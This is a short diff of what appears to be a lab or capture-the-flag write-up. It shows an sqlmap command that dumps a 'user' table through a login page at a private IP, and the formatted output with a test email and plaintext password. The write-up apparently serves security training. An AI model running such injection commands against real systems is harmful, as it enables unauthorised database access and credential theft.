@@ -658,8 +658,15 @@ Database: ai
 SHOW INSIDE TABLE
 sqlmap -u 'http://10.113.166.38/ai/includes/user_login?email=a&password=a' -D ai -T user --dump
 
-[21:05:47] [INFO] retrieved: 12345678
-[21:06:34] [INFO] retrieved: 2023-02-21
+Database: ai
+Table: user
+[1 entry]
++------+-----------------+---------------------+------------+
+| id   | email           | created             | password   |
++------+-----------------+---------------------+------------+
+| 1    | test@chatai.com | 2023-02-21 09:05:46 | 12345678   |
++------+-----------------+---------------------+------------+
+
 ```
   
 </details>
